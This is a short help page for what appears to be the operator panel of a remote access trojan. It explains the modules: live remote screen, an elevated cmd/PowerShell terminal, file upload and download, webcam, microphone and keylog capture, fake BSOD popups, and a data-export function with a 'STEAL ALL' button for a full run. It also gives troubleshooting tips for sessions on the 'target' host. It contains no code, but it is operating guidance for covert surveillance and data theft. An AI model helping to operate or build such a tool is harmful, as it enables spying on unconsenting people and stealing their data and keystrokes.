Help & Support
Getting started

1. Connect with a valid access key from the login page.

2. Use the sidebar to switch modules (dashboard, remote-screen, terminal…).

3. Quick actions live in the top bar: LOCK / UNLOCK / SCREEN / SHUTDOWN.

4. Data export is under data-export — use STEAL ALL for a full run.

Modules overview

dashboard — host info, resources, startup shot

remote-screen — live view + pointer lock control

terminal — cmd / PowerShell / elevated

file-manager — browse, upload, download, mkdir

media-capture — webcam, mic, keylog dump

ui / sys tools — popups, BSOD fake, privileges…

FAQ

Screen stays empty?
Open remote-screen tab to start the WebSocket. Check scale / FPS / monitor selectors.

Commands fail?
Try Admin mode in terminal. Confirm session token is still valid (re-login if needed).

Exports empty?
Target apps must be installed on the host. Check artifacts tab after export.

Lost session?
Use LOGOUT then login again with your key. Enable “Remember session” to persist the key locally.
